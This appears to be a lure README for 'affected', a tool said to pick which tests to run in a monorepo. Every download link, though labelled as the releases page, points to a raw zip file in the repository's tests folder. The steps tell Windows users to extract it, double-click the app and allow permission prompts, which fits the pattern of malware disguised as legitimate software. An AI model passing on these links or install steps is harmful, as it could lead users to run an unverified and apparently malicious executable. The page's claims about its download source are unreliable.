# 🧪 affected - Run fewer tests with confidence

[⬇️ Download affected](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip)

## 🛠️ What it does

affected helps you run only the tests that matter after a change. It checks your project structure, finds which packages or apps are touched, and tells you what needs to be tested.

This is useful for large monorepos with many folders and many test suites. Instead of running everything, you can focus on the parts that changed.

It works with common project types, including:

- Cargo
- npm
- pnpm
- Yarn
- Bun
- Go
- Python
- Maven
- Gradle
- .NET
- Swift
- Dart and Flutter
- Elixir
- sbt

## 📥 Download

1. Visit the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip).
2. Find the latest version for Windows.
3. Download the file that matches your system.
4. Open the downloaded file to start the app.

If your browser saves the file to your Downloads folder, open that folder and double-click the file there.

## 💻 Windows setup

Follow these steps on Windows:

1. Open the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip).
2. Download the Windows version.
3. If the file is in a .zip folder, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the affected app to run it.

If Windows asks for permission, choose Yes.

## 🔍 What you can use it for

Use affected when you want to:

- Skip tests for parts of the project that did not change
- Find which package, app, or module needs a test run
- Save time in local work
- Reduce build time in CI
- Keep test runs focused in a monorepo

It is built for teams and solo users who work with many small projects in one codebase.

## 📁 How it works

affected looks at your project files and checks how parts of the code depend on each other. When you change one file, it traces the related packages and returns the affected set.

In plain terms:

- You make a change
- affected checks what depends on that change
- You run tests for only the impacted parts

This helps when one update can touch many folders but only a few need checks.

## ⚙️ Common use cases

### 🧪 Local testing

If you changed one package, you can test only that package and the things it affects.

### 🔄 Pull request checks

If you open a pull request, you can use affected to see which tests should run before merge.

### 🚦 CI pipelines

In CI, you can skip work for unchanged areas and cut down on wasted time.

### 🧱 Monorepo maintenance

If your repo contains many apps and libraries, affected makes it easier to keep test runs small and clear.

## 🧭 Basic workflow

1. Download the app from the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip).
2. Start the app on Windows.
3. Point it at your project folder.
4. Let it scan the repository.
5. Review the list of affected packages.
6. Run the tests for those parts only.

## 🗂️ Supported project types

affected can work with many common project layouts:

- **Rust and Cargo** for Rust crates
- **JavaScript and TypeScript** projects with npm, pnpm, Yarn, or Bun
- **Go** modules and multi-package repos
- **Python** projects with package-based layouts
- **Java** builds with Maven or Gradle
- **.NET** solutions and projects
- **Swift** app and package setups
- **Flutter and Dart** apps
- **Elixir** applications
- **Scala** projects that use sbt

## 🖱️ First run on Windows

When you open affected for the first time:

1. Choose the folder that holds your project.
2. Wait for the scan to finish.
3. Review the files and packages it found.
4. Pick the affected targets you want to test.

If your project has nested apps or libraries, affected will try to map those links so you can see what changed.

## 🧰 Typical features

- Detects changed packages in monorepos
- Follows project links between folders
- Supports many common build tools
- Helps narrow test runs to what changed
- Fits local use and CI use
- Works across language stacks in one tool

## 📌 What to prepare

Before you use it, have these ready:

- A Windows PC
- A project folder on your drive
- The latest file from the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip)
- Enough disk space for your project scan

For best results, keep your project in a single root folder with each app or package in its own subfolder.

## 🧩 Project layout example

A typical monorepo might look like this:

- `apps/`
- `packages/`
- `services/`
- `libs/`

affected checks these folders and traces how they connect. If you change one shared library, it can mark the apps that use it.

## 🧪 Why this helps

Large repos can slow down test runs. If you run every test every time, you waste time on code that did not change.

affected helps you keep the work focused. That makes it easier to:

- Test faster
- Spot the right scope
- Use less CI time
- Keep builds easier to manage

## 🪟 Windows tips

- Use the latest release
- Keep the app in a folder you can find later
- Extract the file before you open it if it came in a zip archive
- Run it from a local drive for best results
- Keep your project folder closed in other tools if scans feel slow

## 🧷 Where to download

Use this page to get the Windows release:

[Download affected from GitHub Releases](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip)

## 🧪 Workflow for test runs

1. Make your code change.
2. Open affected.
3. Scan the repo.
4. Check the affected list.
5. Run the test command for those parts.
6. Repeat after the next change.

## 🧱 Best fit

affected is a good fit for:

- Monorepos with many small packages
- Teams that want smaller test runs
- Developers who work across more than one language
- CI jobs that need to finish faster
- Repos with clear folder-based project structure

## 📎 Supported tools at a glance

- Cargo
- npm
- pnpm
- Yarn
- Bun
- Go
- Python
- Maven
- Gradle
- .NET
- Swift
- Dart / Flutter
- Elixir
- sbt